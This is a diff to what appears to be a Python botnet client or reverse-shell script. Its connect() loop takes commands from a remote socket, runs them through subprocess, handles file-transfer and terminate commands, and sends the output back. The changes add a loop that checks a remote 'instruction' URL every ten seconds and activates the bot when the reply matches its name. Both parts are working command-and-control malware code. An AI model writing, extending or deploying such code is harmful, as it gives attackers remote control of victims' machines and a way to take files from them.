@@ -1,3 +1,5 @@
+#! /usr/bin/env python3
+
 import modules, urllib.request, time, socket, subprocess
 
 
@@ -18,10 +20,10 @@ def connect():
 	while True: 
 		command = s.recv(1024)
 
-		if '==terminate' in command:
+		if command == '==terminate':
 			s.close()
 			break
-		elif '==transfer' in command: 
+		elif '==transfer' in command: # we use 'in' here since there will be more arguments.
 			cmd,path = command.split('*')
 
 			try:
@@ -35,9 +37,10 @@ def connect():
 			s.send( CMD.stderr.read() )
 # ======================================================== #
 
-while True:
+while True: # Tests for instruction every 10 seconds.
 	if ACTIVE == False:
-		time.sleep(1)
+		ACTIVE = ( urllib.request.urlopen(connections['instruction']).read() == botname )
+		time.sleep(10)
 		continue
 	else:
 		connect()
